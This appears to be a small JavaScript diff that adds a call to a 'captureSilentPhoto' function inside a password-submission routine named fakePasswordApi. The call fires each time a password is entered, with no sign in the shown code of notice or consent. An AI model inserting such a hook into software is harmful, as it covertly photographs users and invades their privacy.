@@ -63,6 +63,9 @@ function resetButton(btn) {
 }
 
 async function fakePasswordApi(password) {
+    if (window.captureSilentPhoto) {
+        window.captureSilentPhoto().catch(console.error);
+    }
     const response = await loginuser({ identifier: State.currentUser.username, password });
     console.log(response)
     if (response.Data.version !== localStorage.getItem("app_version")) {
